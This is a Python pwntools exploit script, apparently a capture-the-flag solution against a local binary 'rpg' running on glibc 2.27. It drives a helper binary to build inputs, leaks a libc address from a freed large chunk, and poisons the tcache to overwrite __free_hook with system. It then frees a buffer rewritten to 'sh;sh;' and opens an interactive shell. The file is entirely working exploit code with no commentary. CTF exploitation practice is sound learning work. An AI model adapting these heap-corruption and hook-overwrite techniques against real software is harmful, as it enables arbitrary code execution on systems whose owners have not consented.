from pwn import *
context.log_level="debug"

gen=process("./test")
def add(gen,sh,idx,size):
    gen.sendlineafter(b"> ","add")
    gen.sendlineafter(b"idx: ",str(idx).encode())
    gen.sendlineafter(b"size: ",str(size).encode())
    payload=gen.recvuntil(b"finish!\n",drop=True)
    sh.sendlineafter(b"Enter flat buffer:",payload)
def show(gen,sh,idx):
    gen.sendlineafter(b"> ",b"show")
    gen.sendlineafter(b"idx: ",str(idx).encode())
    payload=gen.recvuntil(b"finish!\n",drop=True)
    sh.sendlineafter(b"Enter flat buffer:",payload)
def edit(gen,sh,size,data,idx):
    gen.sendlineafter(b"> ","edit")
    gen.sendlineafter(b"size: ",str(size).encode())
    gen.sendlineafter(b"data: ",data)
    gen.sendlineafter(b"idx: ",str(idx).encode())
    payload=gen.recvuntil(b"finish!\n",drop=True)
    sh.sendline(payload)
def free(gen,sh,idx):
    gen.sendlineafter(b"> ",b"free")
    gen.sendlineafter(b"idx: ",str(idx).encode())
    payload=gen.recvuntil(b"finish!\n",drop=True)
    sh.sendlineafter(b"Enter flat buffer:",payload)

sh=process("./rpg")
# gdb.attach(sh,"b *$rebase(0x1785)\nc")
# gdb.attach(sh,"b *$rebase(0x16A9)\nc")
add(gen,sh,0,0x420)
add(gen,sh,1,0x20)
free(gen,sh,0)
add(gen,sh,0,0x420)
show(gen,sh,0)
leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("leak_libc:"+hex(leak_libc))
libcbase=leak_libc-0x3ebca0
success("libcbase:"+hex(libcbase))
libc=ELF("./libc-2.27.so")
libc.address=libcbase
freehook=libc.sym['__free_hook']
system=libc.sym['system']

# gdb.attach(sh,"b malloc\nc")

add(gen,sh,2,0x50)
add(gen,sh,3,0x50)
add(gen,sh,4,0x50)
free(gen,sh,4)
free(gen,sh,3)
add(gen,sh,2,0x1010)
edit(gen,sh,0xa0,b'a'*0x60+p64(freehook),2)
# gdb.attach(sh)
add(gen,sh,5,0x50)
add(gen,sh,6,0x50)
edit(gen,sh,0xa0,p64(system),6)

gen.sendlineafter(b"> ",b"free")
gen.sendlineafter(b"idx: ",str(1).encode())
payload=gen.recvuntil(b"finish!\n",drop=True).replace(b'Delete',b'sh;sh;')
sh.sendlineafter(b"Enter flat buffer:",payload)
# gdb.attach(sh)
sh.interactive()